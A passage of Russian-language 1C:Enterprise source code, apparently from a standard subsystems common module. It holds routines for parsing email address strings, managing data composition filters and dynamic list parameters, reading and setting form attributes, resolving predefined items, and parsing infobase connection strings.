				Индекс = ? ((ПропуститьПробелы(СтрокаАдреса, Индекс, "" "") - 1) > Индекс,
				ПропуститьПробелы(СтрокаАдреса, Индекс, "" "") - 1,
				Индекс);
				Если      СтадияРазбора = 1 Тогда
					ПолноеИмяАдресата = ПолноеИмяАдресата + Накопитель + "" "";
				ИначеЕсли СтадияРазбора = 2 Тогда
					ПочтовыйАдрес = Накопитель;
					СтадияРазбора = 3;
				КонецЕсли;
				Накопитель = """";
			ИначеЕсли Символ = ""@"" Тогда
				Если      СтадияРазбора = 1 Тогда
					СтадияРазбора = 2;
					
					Для ИндексПоискаНС = 1 По СтрДлина(Накопитель) Цикл
						Если СтрНайти(НедопустимыеСимволы, Сред(Накопитель, ИндексПоискаНС, 1)) > 0 И ВызыватьИсключение Тогда
							ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(СообщениеНедопустимыеСимволы,
								Сред(Накопитель, ИндексПоискаНС, 1),СтрокаАдреса);
						КонецЕсли;
					КонецЦикла;
					
					Накопитель = Накопитель + Символ;
				ИначеЕсли СтадияРазбора = 2 И ВызыватьИсключение Тогда
					ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(СообщениеНеверныйФорматПочтовогоАдреса,СтрокаАдреса);
				ИначеЕсли СтадияРазбора = 3 И ВызыватьИсключение Тогда
					ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(СообщениеНеверныйФорматПочтовогоАдреса,СтрокаАдреса);
				КонецЕсли;
			Иначе
				Если СтадияРазбора = 2 ИЛИ СтадияРазбора = 3 Тогда
					Если СтрНайти(НедопустимыеСимволы, Символ) > 0 И ВызыватьИсключение Тогда
						ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(СообщениеНедопустимыеСимволы,Символ,СтрокаАдреса);
					КонецЕсли;
				КонецЕсли;
				
				Накопитель = Накопитель + Символ;
			КонецЕсли;
			
			Индекс = Индекс + 1;
		КонецЦикла;
		
		Если      СтадияРазбора = 1 Тогда
			ПолноеИмяАдресата = ПолноеИмяАдресата + Накопитель;
		ИначеЕсли СтадияРазбора = 2 Тогда
			ПочтовыйАдрес = Накопитель;
		КонецЕсли;
		
		Если ПустаяСтрока(ПочтовыйАдрес) И (Не ПустаяСтрока(ПолноеИмяАдресата)) И ВызыватьИсключение Тогда
			ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(СообщениеНеверныйФорматПочтовогоАдреса, ПолноеИмяАдресата);
		ИначеЕсли СтрЧислоВхождений(ПочтовыйАдрес, ""@"") <> 1 И ВызыватьИсключение Тогда 
			ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(СообщениеНеверныйФорматПочтовогоАдреса,ПочтовыйАдрес);
		КонецЕсли;
		
		Если НЕ (ПустаяСтрока(ПолноеИмяАдресата) И ПустаяСтрока(ПочтовыйАдрес)) Тогда
			Результат.Добавить(ПроверитьИПодготовитьПочтовыйАдрес(ПолноеИмяАдресата, ПочтовыйАдрес));
		КонецЕсли;
		
	КонецЦикла;
	
	Возврат Результат;
	
КонецФункции

////////////////////////////////////////////////////////////////////////////////
// Функции для работы с отборами и параметрами динамических списков.
//

// Найти элемент или группу отбора по заданному имени поля или представлению.
//
// Параметры:
//  ОбластьПоиска - ОтборКомпоновкиДанных, КоллекцияЭлементовОтбораКомпоновкиДанных,
//                  ГруппаЭлементовОтбораКомпоновкиДанных - контейнер
//                  с элементами и группами отбора, например Список.Отбор или группа в отборе.
//  ИмяПоля       - Строка - имя поля компоновки (не используется для групп).
//  Представление - Строка - представление поля компоновки.
//
// Возвращаемое значение:
//  Массив - коллекция отборов.
//
Функция НайтиЭлементыИГруппыОтбора(Знач ОбластьПоиска,
									Знач ИмяПоля = Неопределено,
									Знач Представление = Неопределено) Экспорт
	
	Если ЗначениеЗаполнено(ИмяПоля) Тогда
		ЗначениеПоиска = Новый ПолеКомпоновкиДанных(ИмяПоля);
		СпособПоиска = 1;
	Иначе
		СпособПоиска = 2;
		ЗначениеПоиска = Представление;
	КонецЕсли;
	
	МассивЭлементов = Новый Массив;
	
	НайтиРекурсивно(ОбластьПоиска.Элементы, МассивЭлементов, СпособПоиска, ЗначениеПоиска);
	
	Возврат МассивЭлементов;
	
КонецФункции

// Добавить группу отбора в коллекцию КоллекцияЭлементов.
//
// Параметры:
//  КоллекцияЭлементов - ОтборКомпоновкиДанных, КоллекцияЭлементовОтбораКомпоновкиДанных,
//                       ГруппаЭлементовОтбораКомпоновкиДанных - контейнер
//                       с элементами и группами отбора, например Список.Отбор или группа в отборе.
//  Представление      - Строка - представление группы.
//  ТипГруппы          - ТипГруппыЭлементовОтбораКомпоновкиДанных - тип группы.
//
// Возвращаемое значение:
//  ГруппаЭлементовОтбораКомпоновкиДанных - группа отбора.
//
Функция СоздатьГруппуЭлементовОтбора(Знач КоллекцияЭлементов, Представление, ТипГруппы) Экспорт
	
	Если ТипЗнч(КоллекцияЭлементов) = Тип(""ГруппаЭлементовОтбораКомпоновкиДанных"") Тогда
		КоллекцияЭлементов = КоллекцияЭлементов.Элементы;
	КонецЕсли;
	
	ГруппаЭлементовОтбора = НайтиЭлементОтбораПоПредставлению(КоллекцияЭлементов, Представление);
	Если ГруппаЭлементовОтбора = Неопределено Тогда
		ГруппаЭлементовОтбора = КоллекцияЭлементов.Добавить(Тип(""ГруппаЭлементовОтбораКомпоновкиДанных""));
	Иначе
		ГруппаЭлементовОтбора.Элементы.Очистить();
	КонецЕсли;
	
	ГруппаЭлементовОтбора.Представление    = Представление;
	ГруппаЭлементовОтбора.Применение       = ТипПримененияОтбораКомпоновкиДанных.Элементы;
	ГруппаЭлементовОтбора.РежимОтображения = РежимОтображенияЭлементаНастройкиКомпоновкиДанных.Недоступный;
	ГруппаЭлементовОтбора.ТипГруппы        = ТипГруппы;
	ГруппаЭлементовОтбора.Использование    = Истина;
	
	Возврат ГруппаЭлементовОтбора;
	
КонецФункции

// Добавить элемент компоновки в контейнер элементов компоновки.
//
// Параметры:
//  ОбластьДобавления - КоллекцияЭлементовОтбораКомпоновкиДанных - контейнер с элементами и группами отбора,
//                                                                 например, Список.Отбор или группа в отборе.
//  ИмяПоля                 - Строка - имя поля компоновки данных (заполняется всегда).
//  ПравоеЗначение          - Произвольный - сравниваемое значение.
//  ВидСравнения            - ВидСравненияКомпоновкиДанных - вид сравнения.
//  Представление           - Строка - представление элемента компоновки данных.
//  Использование           - Булево - использование элемента.
//  РежимОтображения        - РежимОтображенияЭлементаНастройкиКомпоновкиДанных - режим отображения.
//  ИдентификаторПользовательскойНастройки - Строка - см. ОтборКомпоновкиДанных.ИдентификаторПользовательскойНастройки
//                                                    в синтакс-помощнике.
// Возвращаемое значение:
//  ЭлементОтбораКомпоновкиДанных - элемент компоновки.
//
Функция ДобавитьЭлементКомпоновки(ОбластьДобавления,
									Знач ИмяПоля,
									Знач ВидСравнения,
									Знач ПравоеЗначение = Неопределено,
									Знач Представление  = Неопределено,
									Знач Использование  = Неопределено,
									знач РежимОтображения = Неопределено,
									знач ИдентификаторПользовательскойНастройки = Неопределено) Экспорт
	
	Элемент = ОбластьДобавления.Элементы.Добавить(Тип(""ЭлементОтбораКомпоновкиДанных""));
	Элемент.ЛевоеЗначение = Новый ПолеКомпоновкиДанных(ИмяПоля);
	Элемент.ВидСравнения = ВидСравнения;
	
	Если РежимОтображения = Неопределено Тогда
		Элемент.РежимОтображения = РежимОтображенияЭлементаНастройкиКомпоновкиДанных.Недоступный;
	Иначе
		Элемент.РежимОтображения = РежимОтображения;
	КонецЕсли;
	
	Если ПравоеЗначение <> Неопределено Тогда
		Элемент.ПравоеЗначение = ПравоеЗначение;
	КонецЕсли;
	
	Если Представление <> Неопределено Тогда
		Элемент.Представление = Представление;
	КонецЕсли;
	
	Если Использование <> Неопределено Тогда
		Элемент.Использование = Использование;
	КонецЕсли;
	
	// Важно: установка идентификатора должна выполняться
	// в конце настройки элемента, иначе он будет скопирован
	// в пользовательские настройки частично заполненным.
	Если ИдентификаторПользовательскойНастройки <> Неопределено Тогда
		Элемент.ИдентификаторПользовательскойНастройки = ИдентификаторПользовательскойНастройки;
	ИначеЕсли Элемент.РежимОтображения <> РежимОтображенияЭлементаНастройкиКомпоновкиДанных.Недоступный Тогда
		Элемент.ИдентификаторПользовательскойНастройки = ИмяПоля;
	КонецЕсли;
	
	Возврат Элемент;
	
КонецФункции

// Изменить элемент отбора с заданным именем поля или представлением.
//
// Параметры:
//  ОбластьПоиска - КоллекцияЭлементовОтбораКомпоновкиДанных - контейнер с элементами и группами отбора,
//                                                             например, Список.Отбор или группа в отборе.
//  ИмяПоля                 - Строка - имя поля компоновки данных (заполняется всегда).
//  Представление           - Строка - представление элемента компоновки данных.
//  ПравоеЗначение          - Произвольный - сравниваемое значение.
//  ВидСравнения            - ВидСравненияКомпоновкиДанных - вид сравнения.
//  Использование           - Булево - использование элемента.
//  РежимОтображения        - РежимОтображенияЭлементаНастройкиКомпоновкиДанных - режим отображения.
//  ИдентификаторПользовательскойНастройки - Строка - см. ОтборКомпоновкиДанных.ИдентификаторПользовательскойНастройки
//                                                    в синтакс-помощнике.
//
// Возвращаемое значение:
//  Число - количество измененных элементов.
//
Функция ИзменитьЭлементыОтбора(ОбластьПоиска,
								Знач ИмяПоля = Неопределено,
								Знач Представление = Неопределено,
								Знач ПравоеЗначение = Неопределено,
								Знач ВидСравнения = Неопределено,
								Знач Использование = Неопределено,
								Знач РежимОтображения = Неопределено,
								Знач ИдентификаторПользовательскойНастройки = Неопределено) Экспорт
	
	Если ЗначениеЗаполнено(ИмяПоля) Тогда
		ЗначениеПоиска = Новый ПолеКомпоновкиДанных(ИмяПоля);
		СпособПоиска = 1;
	Иначе
		СпособПоиска = 2;
		ЗначениеПоиска = Представление;
	КонецЕсли;
	
	МассивЭлементов = Новый Массив;
	
	НайтиРекурсивно(ОбластьПоиска.Элементы, МассивЭлементов, СпособПоиска, ЗначениеПоиска);
	
	Для Каждого Элемент Из МассивЭлементов Цикл
		Если ИмяПоля <> Неопределено Тогда
			Элемент.ЛевоеЗначение = Новый ПолеКомпоновкиДанных(ИмяПоля);
		КонецЕсли;
		Если Представление <> Неопределено Тогда
			Элемент.Представление = Представление;
		КонецЕсли;
		Если Использование <> Неопределено Тогда
			Элемент.Использование = Использование;
		КонецЕсли;
		Если ВидСравнения <> Неопределено Тогда
			Элемент.ВидСравнения = ВидСравнения;
		КонецЕсли;
		Если ПравоеЗначение <> Неопределено Тогда
			Элемент.ПравоеЗначение = ПравоеЗначение;
		КонецЕсли;
		Если РежимОтображения <> Неопределено Тогда
			Элемент.РежимОтображения = РежимОтображения;
		КонецЕсли;
		Если ИдентификаторПользовательскойНастройки <> Неопределено Тогда
			Элемент.ИдентификаторПользовательскойНастройки = ИдентификаторПользовательскойНастройки;
		КонецЕсли;
	КонецЦикла;
	
	Возврат МассивЭлементов.Количество();
	
КонецФункции

// Удалить элементы отбора с заданным именем поля или представлением.
//
// Параметры:
//  ОбластьУдаления - КоллекцияЭлементовОтбораКомпоновкиДанных - контейнер с элементами и группами отбора,
//                                                               например, Список.Отбор или группа в отборе..
//  ИмяПоля         - Строка - имя поля компоновки (не используется для групп).
//  Представление   - Строка - представление поля компоновки.
//
Процедура УдалитьЭлементыГруппыОтбора(Знач ОбластьУдаления, Знач ИмяПоля = Неопределено, Знач Представление = Неопределено) Экспорт
	
	Если ЗначениеЗаполнено(ИмяПоля) Тогда
		ЗначениеПоиска = Новый ПолеКомпоновкиДанных(ИмяПоля);
		СпособПоиска = 1;
	Иначе
		СпособПоиска = 2;
		ЗначениеПоиска = Представление;
	КонецЕсли;
	
	МассивЭлементов = Новый Массив;
	
	НайтиРекурсивно(ОбластьУдаления.Элементы, МассивЭлементов, СпособПоиска, ЗначениеПоиска);
	
	Для Каждого Элемент Из МассивЭлементов Цикл
		Если Элемент.Родитель = Неопределено Тогда
			ОбластьУдаления.Элементы.Удалить(Элемент);
		Иначе
			Элемент.Родитель.Элементы.Удалить(Элемент);
		КонецЕсли;
	КонецЦикла;
	
КонецПроцедуры

// Добавить или заменить существующий элемент отбора.
//
// Параметры:
//  ОбластьПоискаДобавления - КоллекцияЭлементовОтбораКомпоновкиДанных - контейнер с элементами и группами отбора,
//                                     например, Список.Отбор или группа в отборе.
//  ИмяПоля                 - Строка - имя поля компоновки данных (заполняется всегда).
//  ПравоеЗначение          - произвольный - сравниваемое значение.
//  ВидСравнения            - ВидСравненияКомпоновкиДанных - вид сравнения.
//  Представление           - Строка - представление элемента компоновки данных.
//  Использование           - Булево - использование элемента.
//  РежимОтображения        - РежимОтображенияЭлементаНастройкиКомпоновкиДанных - режим отображения.
//  ИдентификаторПользовательскойНастройки - Строка - см. ОтборКомпоновкиДанных.ИдентификаторПользовательскойНастройки
//                                                    в синтакс-помощнике.
//
Процедура УстановитьЭлементОтбора(ОбластьПоискаДобавления,
								Знач ИмяПоля,
								Знач ПравоеЗначение = Неопределено,
								Знач ВидСравнения = Неопределено,
								Знач Представление = Неопределено,
								Знач Использование = Неопределено,
								Знач РежимОтображения = Неопределено,
								Знач ИдентификаторПользовательскойНастройки = Неопределено) Экспорт
	
	ЧислоИзмененных = ИзменитьЭлементыОтбора(ОбластьПоискаДобавления, ИмяПоля, Представление,
							ПравоеЗначение, ВидСравнения, Использование, РежимОтображения, ИдентификаторПользовательскойНастройки);
	
	Если ЧислоИзмененных = 0 Тогда
		Если ВидСравнения = Неопределено Тогда
			Если ТипЗнч(ПравоеЗначение) = Тип(""Массив"")
				Или ТипЗнч(ПравоеЗначение) = Тип(""ФиксированныйМассив"")
				Или ТипЗнч(ПравоеЗначение) = Тип(""СписокЗначений"") Тогда
				ВидСравнения = ВидСравненияКомпоновкиДанных.ВСписке;
			Иначе
				ВидСравнения = ВидСравненияКомпоновкиДанных.Равно;
			КонецЕсли;
		КонецЕсли;
		Если РежимОтображения = Неопределено Тогда
			РежимОтображения = РежимОтображенияЭлементаНастройкиКомпоновкиДанных.Недоступный;
		КонецЕсли;
		ДобавитьЭлементКомпоновки(ОбластьПоискаДобавления, ИмяПоля, ВидСравнения,
								ПравоеЗначение, Представление, Использование, РежимОтображения, ИдентификаторПользовательскойНастройки);
	КонецЕсли;
	
КонецПроцедуры

// Добавить или заменить существующий элемент отбора динамического списка.
//
// Параметры:
//   ДинамическийСписок - ДинамическийСписок - Список, в котором требуется установить отбор.
//   ИмяПоля            - Строка - Поле, по которому необходимо установить отбор.
//   ПравоеЗначение     - Произвольный - Значение отбора.
//       Необязательный. Значение по умолчанию: Неопределено.
//       Внимание! Если передать Неопределено, то значение не будет изменено.
//   ВидСравнения  - ВидСравненияКомпоновкиДанных - Условие отбора.
//   Представление - Строка - Представление элемента компоновки данных.
//       Необязательный. Значение по умолчанию: Неопределено.
//       Если указано, то выводится только флажок использования с указанным представлением (значение не выводится).
//       Для очистки (чтобы значение снова выводилось) следует передать пустую строку.
//   Использование - Булево - Флажок использования этого отбора.
//       Необязательный. Значение по умолчанию: Неопределено.
//   РежимОтображения - РежимОтображенияЭлементаНастройкиКомпоновкиДанных - Способ отображения этого отбора
//                                                                          пользователю.
//       * РежимОтображенияЭлементаНастройкиКомпоновкиДанных.БыстрыйДоступ - В группе быстрых настроек над списком.
//       * РежимОтображенияЭлементаНастройкиКомпоновкиДанных.Обычный       - В настройка списка (в подменю Еще).
//       * РежимОтображенияЭлементаНастройкиКомпоновкиДанных.Недоступный   - Запретить пользователю менять этот отбор.
//   ИдентификаторПользовательскойНастройки - Строка - Уникальный идентификатор этого отбора.
//       Используется для связи с пользовательскими настройками.
//
Процедура УстановитьЭлементОтбораДинамическогоСписка(ДинамическийСписок, ИмяПоля,
	ПравоеЗначение = Неопределено,
	ВидСравнения = Неопределено,
	Представление = Неопределено,
	Использование = Неопределено,
	РежимОтображения = Неопределено,
	ИдентификаторПользовательскойНастройки = Неопределено) Экспорт
	
	Если РежимОтображения = Неопределено Тогда
		РежимОтображения = РежимОтображенияЭлементаНастройкиКомпоновкиДанных.Недоступный;
	КонецЕсли;
	
	Если РежимОтображения = РежимОтображенияЭлементаНастройкиКомпоновкиДанных.Недоступный Тогда
		ОтборДинамическогоСписка = ДинамическийСписок.КомпоновщикНастроек.ФиксированныеНастройки.Отбор;
	Иначе
		ОтборДинамическогоСписка = ДинамическийСписок.КомпоновщикНастроек.Настройки.Отбор;
	КонецЕсли;
	
	УстановитьЭлементОтбора(
		ОтборДинамическогоСписка,
		ИмяПоля,
		ПравоеЗначение,
		ВидСравнения,
		Представление,
		Использование,
		РежимОтображения,
		ИдентификаторПользовательскойНастройки);
	
КонецПроцедуры

// Удалить элемент группы отбора динамического списка.
//
// Параметры:
//  ДинамическийСписок - ДинамическийСписок - реквизит формы, для которого требуется установить отбор.
//  ИмяПоля         - Строка - имя поля компоновки (не используется для групп).
//  Представление   - Строка - представление поля компоновки.
//
Процедура УдалитьЭлементыГруппыОтбораДинамическогоСписка(ДинамическийСписок, ИмяПоля = Неопределено, Представление = Неопределено) Экспорт
	
	УдалитьЭлементыГруппыОтбора(
		ДинамическийСписок.КомпоновщикНастроек.ФиксированныеНастройки.Отбор,
		ИмяПоля,
		Представление);
	
	УдалитьЭлементыГруппыОтбора(
		ДинамическийСписок.КомпоновщикНастроек.Настройки.Отбор,
		ИмяПоля,
		Представление);
	
КонецПроцедуры

// Установить или обновить значение параметра ИмяПараметра динамического списка Список.
//
// Параметры:
//  Список          - ДинамическийСписок - реквизит формы, для которого требуется установить параметр.
//  ИмяПараметра    - Строка             - имя параметра динамического списка.
//  Значение        - Произвольный        - новое значение параметра.
//  Использование   - Булево             - признак использования параметра.
//
Процедура УстановитьПараметрДинамическогоСписка(Список, ИмяПараметра, Значение, Использование = Истина) Экспорт
	
	ЗначениеПараметраКомпоновкиДанных = Список.Параметры.НайтиЗначениеПараметра(Новый ПараметрКомпоновкиДанных(ИмяПараметра));
	Если ЗначениеПараметраКомпоновкиДанных <> Неопределено Тогда
		Если Использование И ЗначениеПараметраКомпоновкиДанных.Значение <> Значение Тогда
			ЗначениеПараметраКомпоновкиДанных.Значение = Значение;
		КонецЕсли;
		Если ЗначениеПараметраКомпоновкиДанных.Использование <> Использование Тогда
			ЗначениеПараметраКомпоновкиДанных.Использование = Использование;
		КонецЕсли;
	КонецЕсли;
	
КонецПроцедуры

////////////////////////////////////////////////////////////////////////////////
// Функции для работы с управляемыми формами.
//

// Получает значение реквизита формы.
//
// Параметры:
//  Форма - УправляемаяФорма - форма.
//  ПутьРеквизита - Строка - путь к данным реквизита формы, например: ""Объект.МесяцНачисления"".
//
// Возвращаемое значение:
//  Произвольный - реквизит формы.
//
Функция ПолучитьРеквизитФормыПоПути(Форма, ПутьРеквизита) Экспорт
	
	МассивИмен = СтрРазделить(ПутьРеквизита, ""."");
	
	Объект        = Форма;
	ПоследнееПоле = МассивИмен[МассивИмен.Количество()-1];
	
	Для Сч = 0 По МассивИмен.Количество()-2 Цикл
		Объект = Объект[МассивИмен[Сч]]
	КонецЦикла;
	
	Возврат Объект[ПоследнееПоле];
	
КонецФункции

// Устанавливает значение реквизиту формы.
// Параметры:
//  Форма - УправляемаяФорма - форма-владелец реквизита.
//  ПутьРеквизита - Строка - путь к данным, например: ""Объект.МесяцНачисления"".
//  Значение - Произвольный - устанавливаемое значение.
//  ТолькоЕслиНеЗаполнен - Булево - позволяет не устанавливать значение реквизита,
//                                  если у него уже установлено какое-то значение.
Процедура УстановитьРеквизитФормыПоПути(Форма, ПутьРеквизита, Значение, ТолькоЕслиНеЗаполнен = Ложь) Экспорт
	
	МассивИмен = СтрРазделить(ПутьРеквизита, ""."");
	
	Объект        = Форма;
	ПоследнееПоле = МассивИмен[МассивИмен.Количество()-1];
	
	Для Сч = 0 По МассивИмен.Количество()-2 Цикл
		Объект = Объект[МассивИмен[Сч]]
	КонецЦикла;
	Если НЕ ТолькоЕслиНеЗаполнен ИЛИ НЕ ЗначениеЗаполнено(Объект[ПоследнееПоле]) Тогда
		Объект[ПоследнееПоле] = Значение;
	КонецЕсли;
	
КонецПроцедуры

// Выполняет поиск элемента отбора в коллекции по заданному представлению.
//
// Параметры:
//  КоллекцияЭлементов - КоллекцияЭлементовОтбораКомпоновкиДанных - контейнер с элементами и группами отбора,
//                                                                  например, Список.Отбор.Элементы или группа в отборе.
//  Представление - Строка - представление группы.
// 
// Возвращаемое значение:
//  ЭлементОтбораКомпоновкиДанных - элемент отбора.
//
Функция НайтиЭлементОтбораПоПредставлению(КоллекцияЭлементов, Представление) Экспорт
	
	ВозвращаемоеЗначение = Неопределено;
	
	Для каждого ЭлементОтбора Из КоллекцияЭлементов Цикл
		Если ЭлементОтбора.Представление = Представление Тогда
			ВозвращаемоеЗначение = ЭлементОтбора;
			Прервать;
		КонецЕсли;
	КонецЦикла;
	
	Возврат ВозвращаемоеЗначение
	
КонецФункции

// Устанавливает свойство ИмяСвойства элемента формы с именем ИмяЭлемента в значение Значение.
// Применяется в тех случаях, когда элемент формы может не быть на форме из-за отсутствия прав у пользователя
// на объект, реквизит объекта или команду.
//
// Параметры:
//  ЭлементыФормы - ВсеЭлементФормы, ЭлементыФормы - коллекция элементов управляемой формы.
//  ИмяЭлемента   - Строка       - имя элемента формы.
//  ИмяСвойства   - Строка       - имя устанавливаемого свойства элемента формы.
//  Значение      - Произвольный - новое значение элемента.
// 
Процедура УстановитьСвойствоЭлементаФормы(ЭлементыФормы, ИмяЭлемента, ИмяСвойства, Значение) Экспорт
	
	ЭлементФормы = ЭлементыФормы.Найти(ИмяЭлемента);
	Если ЭлементФормы <> Неопределено И ЭлементФормы[ИмяСвойства] <> Значение Тогда
		ЭлементФормы[ИмяСвойства] = Значение;
	КонецЕсли;
	
КонецПроцедуры 

// Возвращает значение свойства ИмяСвойства элемента формы с именем ИмяЭлемента.
// Применяется в тех случаях, когда элемент формы может не быть на форме из-за отсутствия прав у пользователя
// на объект, реквизит объекта или команду.
//
// Параметры:
//  ЭлементыФормы - ВсеЭлементФормы, ЭлементыФормы - коллекция элементов управляемой формы.
//  ИмяЭлемента   - Строка       - имя элемента формы.
//  ИмяСвойства   - Строка       - имя свойства элемента формы.
// 
// Возвращаемое значение:
//   Произвольный - значение свойства ИмяСвойства элемента формы ИмяЭлемента.
// 
Функция ЗначениеСвойстваЭлементаФормы(ЭлементыФормы, ИмяЭлемента, ИмяСвойства) Экспорт
	
	ЭлементФормы = ЭлементыФормы.Найти(ИмяЭлемента);
	Возврат ?(ЭлементФормы <> Неопределено, ЭлементФормы[ИмяСвойства], Неопределено);
	
КонецФункции 

////////////////////////////////////////////////////////////////////////////////
// Работа с предопределенными данными.
//

// Получает ссылку предопределенного элемента по его полному имени.
// Предопределенные элементы могут содержаться только в следующих объектах:
//   - Справочники;
//   - Планы видов характеристик;
//   - Планы счетов;
//   - Планы видов расчета.
// После изменения состава предопределенных следует выполнить метод
// ОбновитьПовторноИспользуемыеЗначения(), который сбросит кэш ПовтИсп в текущем сеансе.
//
// Параметры:
//   ПолноеИмяПредопределенного - Строка - Полный путь к предопределенному элементу, включая его имя.
//     Формат аналогичен функции глобального контекста ПредопределенноеЗначение().
//     Например:
//       ""Справочник.ВидыКонтактнойИнформации.EmailПользователя""
//       ""ПланСчетов.Хозрасчетный.Материалы""
//       ""ПланВидовРасчета.Начисления.ОплатаПоОкладу"".
//
// Возвращаемое значение: 
//   ЛюбаяСсылка - ссылка на предопределенный элемент.
//   Неопределено - если предопределенный есть в метаданных, но не создан в ИБ.
//
Функция ПредопределенныйЭлемент(ПолноеИмяПредопределенного) Экспорт
	
	// Используется стандартная функция платформы для получения:
	//  - пустых ссылок; 
	//  - значений перечислений;
	//  - точек маршрута бизнес-процессов.
	Если "".ПУСТАЯССЫЛКА"" = ВРег(Прав(ПолноеИмяПредопределенного, 13))
		Или ""ПЕРЕЧИСЛЕНИЕ."" = ВРег(Лев(ПолноеИмяПредопределенного, 13)) 
		Или ""БИЗНЕСПРОЦЕСС."" = ВРег(Лев(ПолноеИмяПредопределенного, 14)) Тогда
		
		Возврат ПредопределенноеЗначение(ПолноеИмяПредопределенного);
	КонецЕсли;
	
	// Разбор полного имени предопределенного.
	ЧастиПолногоИмени = СтрРазделить(ПолноеИмяПредопределенного, ""."");
	Если ЧастиПолногоИмени.Количество() <> 3 Тогда 
		ВызватьИсключение ТекстОшибкиПредопределенноеЗначениеНеНайдено(ПолноеИмяПредопределенного);
	КонецЕсли;
	
	ПолноеИмяОбъектаМетаданных = ВРег(ЧастиПолногоИмени[0] + ""."" + ЧастиПолногоИмени[1]);
	ИмяПредопределенного = ЧастиПолногоИмени[2];
	
	// В зависимости от контекста выполняется обращение к разному кэшу.
	
#Если Сервер Или ТолстыйКлиентОбычноеПриложение Или ВнешнееСоединение Тогда
	ПредопределенныеЗначения = СтандартныеПодсистемыПовтИсп.СсылкиПоИменамПредопределенных(ПолноеИмяОбъектаМетаданных);
#Иначе
	ПредопределенныеЗначения = СтандартныеПодсистемыКлиентПовтИсп.СсылкиПоИменамПредопределенных(ПолноеИмяОбъектаМетаданных);
#КонецЕсли

	// Если ошибка в имени метаданных.
	Если ПредопределенныеЗначения = Неопределено Тогда 
		ВызватьИсключение ТекстОшибкиПредопределенноеЗначениеНеНайдено(ПолноеИмяПредопределенного);
	КонецЕсли;

	// Получение результата из кэша.
	Результат = ПредопределенныеЗначения.Получить(ИмяПредопределенного);
	
	// Если предопределенного нет в метаданных.
	Если Результат = Неопределено Тогда 
		ВызватьИсключение ТекстОшибкиПредопределенноеЗначениеНеНайдено(ПолноеИмяПредопределенного);
	КонецЕсли;
	
	// Если предопределенный есть в метаданных, но не создан в ИБ.
	Если Результат = Null Тогда 
		Возврат Неопределено;
	КонецЕсли;
	
	Возврат Результат;
	
КонецФункции

////////////////////////////////////////////////////////////////////////////////
// Прочие функции
//

// Возвращает шаблон структуры параметров для установки внешнего соединения.
// Параметрам необходимо задать требуемые значения и передать.
// В метод ОбщегоНазначения.УстановитьВнешнееСоединение().
//
// Возвращаемое значение:
//  Структура - коллекция параметров.
//
Функция СтруктураПараметровДляУстановкиВнешнегоСоединения() Экспорт
	
	СтруктураПараметров = Новый Структура;
	СтруктураПараметров.Вставить(""ВариантРаботыИнформационнойБазы"", 0);
	СтруктураПараметров.Вставить(""КаталогИнформационнойБазы"", """");
	СтруктураПараметров.Вставить(""ИмяСервера1СПредприятия"", """");
	СтруктураПараметров.Вставить(""ИмяИнформационнойБазыНаСервере1СПредприятия"", """");
	СтруктураПараметров.Вставить(""АутентификацияОперационнойСистемы"", Ложь);
	СтруктураПараметров.Вставить(""ИмяПользователя"", """");
	СтруктураПараметров.Вставить(""ПарольПользователя"", """");
	
	Возврат СтруктураПараметров;
КонецФункции

// Извлекает из строки соединения с информационной базой параметры подключения
// и передает параметры в структуру для установки внешнего соединения.
//
// Параметры:
//  СтрокаСоединения - Строка - строка соединения ИБ.
// 
// Возвращаемое значение:
//  Структура - см. СтруктураПараметровДляУстановкиВнешнегоСоединения.
//
Функция ПолучитьПараметрыПодключенияИзСтрокиСоединенияИнформационнойБазы(Знач СтрокаСоединения) Экспорт
	
	Результат = СтруктураПараметровДляУстановкиВнешнегоСоединения();
	
	Параметры = СтроковыеФункцииКлиентСервер.ПараметрыИзСтроки(СтрокаСоединения);
	
	Параметры.Свойство(""File"", Результат.КаталогИнформационнойБазы);
	Параметры.Свойство(""Srvr"", Результат.ИмяСервера1СПредприятия);
	Параметры.Свойство(""Ref"",  Результат.ИмяИнформационнойБазыНаСервере1СПредприятия);
	
	Результат.ВариантРаботыИнформационнойБазы = ?(Параметры.Свойство(""File""), 0, 1);
	
	Возврат Результат;
КонецФункции

// Для файлового режима работы возвращает полное имя каталога, в котором расположена информационная база.
// Если режим работы клиент-серверный, то возвращается пустая строка.
//
// Возвращаемое значение:
//  Строка - Полное имя каталога, в котором расположена файловая информационная база.
//
Функция КаталогФайловойИнформационнойБазы() Экспорт
	
	ПараметрыСоединения = СтроковыеФункцииКлиентСервер.ПараметрыИзСтроки(СтрокаСоединенияИнформационнойБазы());
	
	Если ПараметрыСоединения.Свойство(""File"") Тогда
		Возврат ПараметрыСоединения.File;
	КонецЕсли;
	
	Возврат """";
КонецФункции

// Получает идентификатор (метод ПолучитьИдентификатор()) строки дерева значений для заданного значения поля строки
// дерева.
// Используется для позиционирования курсора в иерархических списках.
//
// Параметры:
//  ИмяПоля - Строка - Имя колонки дерева значений, по которому выполняется поиск.
//  ИдентификаторСтроки - Число - полученный в результате поиска идентификатор строки дерева значений.
//  КоллекцияЭлементовДерева - ДанныеФормыКоллекцияЭлементовДерева - коллекция, в которой следует выполнять поиск.
//  КлючСтроки - Произвольный - искомое значение поля.
//  ПрекратитьПоиск - Булево - признак прекращения поиска.
// 
Процедура ПолучитьИдентификаторСтрокиДереваПоЗначениюПоля(ИмяПоля, ИдентификаторСтроки, КоллекцияЭлементовДерева, КлючСтроки, ПрекратитьПоиск) Экспорт
	
	Для Каждого СтрокаДерева Из КоллекцияЭлементовДерева Цикл
		
		Если ПрекратитьПоиск Тогда
			Возврат;
		КонецЕсли;
		
		Если СтрокаДерева[ИмяПоля] = КлючСтроки Тогда
			
			ИдентификаторСтроки = СтрокаДерева.ПолучитьИдентификатор();
			
			ПрекратитьПоиск = Истина;
			
			Возврат;
			
		КонецЕсли;
		
		КоллекцияЭлементов = СтрокаДерева.ПолучитьЭлементы();
		
		Если КоллекцияЭлементов.Количество() > 0 Тогда
			
			ПолучитьИдентификаторСтрокиДереваПоЗначениюПоля(ИмяПоля, ИдентификаторСтроки, КоллекцияЭлементов, КлючСтроки, ПрекратитьПоиск);
